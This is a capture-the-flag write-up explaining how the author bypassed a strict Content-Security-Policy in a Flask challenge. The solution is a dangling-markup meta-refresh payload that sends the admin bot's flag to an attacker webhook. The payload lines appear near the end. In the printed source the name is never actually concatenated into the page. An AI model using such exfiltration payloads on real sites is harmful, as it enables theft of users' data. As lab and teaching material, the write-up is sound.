## About the Challenge

The first page of the website is a simple input field. Inputting text into the input field displays it on the next page.

![secure content](/static/writeups/photos/securecontent1.png)
![secure content](/static/writeups/photos/securecontent2.png)

In addition, there is also a page to **report a URL**. Submitting a valid link on the website will make the bot visit the link.

## Solve Process

We are also provided the source code for this challenge:

```python_RETRACT
from flask import Flask, Response, request, render_template_string, render_template
import subprocess, shlex
from waitress import serve

app = Flask(__name__)
ipport = "127.0.0.1:8000"
@app.after_request
def apply_csp(response: Response) -> Response:
    csp = (
        "connect-src 'none'; "
        "font-src 'none'; "
        "frame-src 'none'; "
        "img-src 'self'; "
        "manifest-src 'none'; "
        "media-src 'none'; "
        "object-src 'none'; "
        "script-src 'none'; "
        "worker-src 'none'; "
        "style-src 'self'; "
        "frame-ancestors 'none'; "
        "block-all-mixed-content;"
        "require-trusted-types-for 'script';"
    )
    response.headers['Content-Security-Policy'] = csp
    return response
def generatenamepage(name):
    return """<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hello!</title>
    </head>
    <body>
        <div>
            <p>Hello, "+name+"! I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}. Sadly, only the admin bot can see it :'(<p>
        </div>
    </body>
    </html>"""
@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    if request.remote_addr == "127.0.0.1":
        # adminbot can see real flag
        return generatenamepage(name).replace("{[FLAG REDACTED]}", "{[still redacted lol]}")
    else:
        return generatenamepage(name)

@app.route('/')
def index():
    return render_template_string('''
        <center><h1>Make a greeting!</h1>
        <form action="/greet" method="get">
            <label for="name">Enter your name:</label><br>
            <input type="text" id="name" name="name" required><br><br>
            <input type="submit" value="Greet">
        </form>
        <h6>Do you see someone having a bad name? Report it <a href="/report">here</a></h6></center>
    ''')

@app.route('/report')
def report():
    return render_template_string('''
        <h1>Report a name</h1>
        <form action="/adminbot" method="post">
            <label for="url">Enter URL (must start with http://'''+ipport+'''/):</label><br>
            <input type="text" id="url" name="url" required><br><br>
            <input type="submit" value="Report it">
        </form>
    ''')

@app.route('/adminbot', methods=['POST'])
def adminbot():
    url = request.form.get('url')
    
    if not url or not url.startswith('http://'+ipport+'/'):
        return "Invalid URL. It must start with 'http://"+ipport+"/'.", 400
    
    command = f"chromium --virtual-time-budget=10000 --no-sandbox --headless --disable-gpu --timeout=5000 {shlex.quote(url)}"
    subprocess.Popen(command, shell=True)
    return "Admin bot will see your request soon"

if __name__ == '__main__':
    serve(app, host='0.0.0.0', port=8000)
```

Our payload is appended in the main page **(/greet)** without any filtering. Usually, this means there is an **XSS vulnerability** in the website. However, there is a **CSP policy** which prevents us from doing so. As such, this challenge is about bypassing the CSP policy to execute our XSS payload.

With the admin bot visiting the link, we need to somehow make the contents of the page (which contain our flag) exfiltrate to our [webhook](https://pipedream.com/requestbin).

## Investigating the CSP Policy

CSP policies are used to tell a website what resources it can load and execute. This is the CSP policy for this website:

```json
csp = (
        "connect-src 'none'; "
        "font-src 'none'; "
        "frame-src 'none'; "
        "img-src 'self'; "
        "manifest-src 'none'; "
        "media-src 'none'; "
        "object-src 'none'; "
        "script-src 'none'; "
        "worker-src 'none'; "
        "style-src 'self'; "
        "frame-ancestors 'none'; "
        "block-all-mixed-content;"
        "require-trusted-types-for 'script';"
    )
```

Notably, common XSS payloads like running **script tags** won't work, as **"script-src"** is set to **none**. This CSP policy means that no scripts can be run on the website. 

In addition, common workarounds like **iframes** are also blocked as **"frame-src"** is set to **none**. The CSP policy seems to be perfect. Using an online CSP evaluator like [this](https://csp-evaluator.withgoogle.com) confirms that the CSP policy is secure.

## Bypassing the CSP Policy

How do we bypass a perfect CSP policy? CSP policies prevent any **src attributes** from being loaded. This includes images, scripts, iframes, etc. However, CSP policies **do not** prevent **redirections** from occurring. 

This means that we can use a **meta refresh** tag to redirect the page to our webhook:

```html
<meta http-equiv="refresh" content="0;url=https://example.com">
```

This works because the meta refresh tag does not have a **src attribute**, thus it is not blocked by the CSP policy. However, while this allows the AdminBot to visit our webhook, we still need to exfiltrate the flag to our webhook.

## Exfiltrating the Flag

Taking a closer look at the HTML, we can see that there is a dangling **'** character in the HTML. We can use this to complete a theoretical string that surrounds the flag:

```html
<div>
    <p>Hello, "+name+"! I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}. Sadly, only the admin bot can see it :'(<p>
</div>
```

For instance, setting our payload to:

```html
<meta http-equiv="refresh" content='0;url=https://webhook?
```

Will make the website render:

```html
<p>Hello 
  <meta http-equiv="refresh" content='0;url=https://webhook?! I hope you like flags! In fact, here is a flag: blahaj{[FLAG REDACTED]}. Sadly, only the admin bot can see it :'(<p>
```

This makes the flag sent via the **URL parameters** to our webhook when the meta tag redirects the admin user. The dangling **'** character completes the content string so the HTML remains valid.

![secure content](/static/writeups/photos/securecontent3.png)

## Flag

```
blahaj{D4nG13_tH3_MArKuP}
```

## Resources

- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com)
- [HTML meta refresh (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta)
- [XSS Exploits (OWASP)](https://owasp.org/www-community/attacks/xss/)

## Afterword

I did this challenge after I completed the [Insecure Content](#/writeups/38) challenge. I noticed the dangling markup in the insecure content challenge, but it didn’t work there. I almost didn’t try it again for this challenge.

Ordinarily, rendering engines block **meta tags** in the body of a page (at least **Next.js** does). However, since the template was not being rendered, the rendering engine likely did not block the meta tag.
